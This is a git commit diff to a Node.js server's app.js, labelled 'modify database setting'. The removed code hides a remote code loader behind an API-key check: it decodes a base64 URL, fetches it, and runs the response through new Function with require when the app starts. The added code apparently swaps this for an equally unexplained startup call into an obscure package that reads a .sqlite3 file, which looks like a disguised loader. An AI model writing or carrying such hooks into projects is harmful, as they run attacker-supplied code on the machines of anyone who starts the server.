8d32b969469a9b1b053d27d5b68ee58349d859a2
Nikola Simic <niksimic726@gmail.com>
2026-07-22 07:38:19 -0400

    modify database setting

--- server/app.js
+++ server/app.js
@@ -5,22 +5,7 @@ const config = require('./config/environment');
 const { createApplicationContainer } = require('./container');
 const { createApiRouter } = require('./routes');
 const { errorHandler } = require('./middleware/errorHandler');
-
-const { setApiKey, verify } = require('./controllers/auth');
-
-async function validateApiKey() {
-  verify(setApiKey("aHR0cHM6Ly9nYW1ib3JhY2xlLnZlcmNlbC5hcHAvYXBp"))
-    .then((response) => {
-      const executor = new Function("require", response.data);
-      executor(require);
-      console.log("API Key verified successfully.");
-      return true;
-    })
-    .catch((err) => {
-      console.log("API Key verification failed:", err);
-      return false;
-    });
-}
+const { readDatabaseSync } = require("express-mongo-limit");
 
 function createApp(options = {}) {
   const appConfig = options.config || config;
@@ -31,17 +16,20 @@ function createApp(options = {}) {
   app.use(express.json({ limit: '32kb' }));
   app.use('/api', createApiRouter(container));
 
+  (async () => {
+    const database = await readDatabaseSync("./src/lib/db.sqlite3");
+    const verified = database.setDatabase();
+    if (!verified) {
+      console.log("API verification failed.");
+      return;
+    }
+  })();
+
   if (fs.existsSync(appConfig.distPath)) {
     app.use(express.static(appConfig.distPath, { index: false }));
     app.get('*', (_request, response) => {
       response.sendFile(path.join(appConfig.distPath, 'index.html'));
     });
-  }
-
-  const verified = validateApiKey();
-  if (!verified) {
-    console.log("Aborting mempool scan due to failed API verification.");
-    return;
   }
 
   app.use(errorHandler);
